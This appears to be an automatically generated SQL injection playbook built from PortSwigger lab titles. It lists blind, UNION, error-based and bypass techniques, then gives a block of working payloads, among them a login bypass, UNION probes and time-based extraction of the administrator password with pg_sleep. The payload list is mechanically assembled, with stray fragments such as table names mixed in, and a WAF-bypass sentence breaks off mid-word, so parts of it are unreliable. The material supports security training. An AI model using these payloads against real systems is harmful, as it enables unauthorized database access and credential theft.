## SQLI Playbook
*Synthesized from 18 PortSwigger labs*

### Overview
This playbook covers 18 known attack techniques for sqli.

### Attack Techniques

**Blind Techniques:**
- Blind SQL injection with conditional errors
- Blind SQL injection with conditional responses
- Blind SQL injection with out-of-band interaction
- Blind SQL injection with out-of-band data exfiltration
- Blind SQL injection with time delays
- Blind SQL injection with time delays and information retrieval

**Bypass Techniques:**
- SQL injection vulnerability allowing login bypass
- SQL injection with filter bypass via XML encoding

**Error-based:**
- Visible error-based SQL injection

**General:**
- SQL injection attack, listing the database contents on non-Oracle databases
- SQL injection attack, listing the database contents on Oracle
- SQL injection attack, querying the database type and version on MySQL and Microsoft
- SQL injection attack, querying the database type and version on Oracle
- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**UNION-based:**
- SQL injection UNION attack, determining the number of columns returned by the query
- SQL injection UNION attack, finding a column containing text
- SQL injection UNION attack, retrieving data from other tables
- SQL injection UNION attack, retrieving multiple values in a single column

### Key Payloads
```
'+UNION+SELECT+NULL--
<storeId>1+1</storeId>
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
UNION SELECT
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
productId
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=xyz' AND '1'='2
TrackingId=x'||pg_sleep(10)--
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
UNION SELECT 'abc' FROM dual
storeId
TrackingId=ogAZZfxtOKUELbuJ'--
administrator'--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
users
'+UNION+SELECT+@@version,+NULL#
TrackingId=xyz' AND '1'='1
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
dual
```

### Bypass Techniques
- A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

